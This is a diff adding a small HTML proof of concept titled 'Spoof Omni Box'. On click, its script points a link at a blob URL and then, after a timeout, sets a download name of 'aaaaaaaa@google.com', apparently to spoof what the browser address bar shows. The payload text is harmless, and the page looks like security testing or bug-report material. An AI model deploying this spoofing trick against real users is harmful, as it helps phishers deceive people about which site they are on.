@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spoof Omni Box</title>
+</head>
+<body>
+
+    <a id="short" href="#">Spoof Omni Box</a>
+    <br><br>
+
+<script>
+    const short = document.getElementById('short')
+
+    short.addEventListener('click', (event) => {
+        var fileContent = 'Blob Spoof with set Interval!';
+        var fileName = 'aaaaaaaa@google.com';
+
+        var blob = new Blob([fileContent], { type: 'text/html' });
+
+        event.target.href = window.URL.createObjectURL(blob);
+        setTimeout(() => {
+            event.target.download = fileName;
+
+        }, 10)
+    })
+</script>
+
+</body>
+</html>
